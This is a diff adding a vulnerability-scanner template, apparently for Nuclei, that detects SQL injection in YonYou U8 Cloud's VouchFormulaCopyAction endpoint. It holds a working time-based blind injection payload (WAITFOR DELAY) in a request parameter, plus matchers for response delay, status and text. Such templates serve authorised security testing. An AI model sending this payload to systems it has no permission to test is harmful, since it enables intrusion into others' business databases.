@@ -1,0 +1,26 @@
+id: YonYouU8_CLOUD-VouchFormulaCopyAction-sqlInjection
+info:
+  name: YonYouU8_CLOUD-VouchFormulaCopyAction-sqlInjection
+  author: iSee857
+  severity: high
+  description: YonYouU8_CLOUD-VouchFormulaCopyAction-sqlInjection
+
+requests:
+  - method: GET
+    raw:
+      - |
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.hbbb.innertrade.VouchFormulaCopyAction&method=execute&selCopyUnitList=1&selUnitList=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A5%27--&selItemList=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '正在执行'
